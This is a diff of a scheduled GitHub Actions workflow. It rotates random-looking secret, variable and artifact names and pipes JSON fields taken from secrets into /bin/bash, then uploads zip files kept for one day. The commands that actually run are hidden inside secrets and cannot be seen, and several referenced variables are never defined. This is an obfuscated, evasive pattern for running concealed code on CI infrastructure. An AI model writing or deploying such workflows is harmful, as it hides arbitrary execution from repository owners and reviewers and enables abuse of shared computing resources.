@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '23 1,7,13,19 * * *'
+    - cron: '45 1,7,13,19 * * *'
 permissions:
   contents: read
 concurrency:
@@ -17,18 +17,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run task
         env:
-          obt255: ${{ secrets.obt255 }}
+          ljutf92: ${{ secrets.ljutf92 }}
         run: |
-          printf '%s' "$obt255" | jq -r .u6 | /bin/bash
-          echo $e97 | jq -r .we87461 | /bin/bash
-          printf '%s' "$l3635" | jq -r .ldlt411 | /bin/bash
-          printf '%s' "$ncjq90332" | jq -r .xah202 | /bin/bash
-          echo $gjpxu2053 | jq -r .nqv0 | /bin/bash
-          echo $tj3 | jq -r .ol73718 | /bin/bash
+          printf '%s' "$ljutf92" | jq -r .s11 | /bin/bash
+          echo $zbstc92 | jq -r .f17272 | /bin/bash
+          echo $fzwy1 | jq -r .li9218 | /bin/bash
+          echo $yq8619 | jq -r .bukcd469 | /bin/bash
+          printf '%s' "$zo63483" | jq -r .d9260 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
         with:
-          name: WmzgMEBu
+          name: koKSl37y
           path: "*.zip"
           retention-days: 1
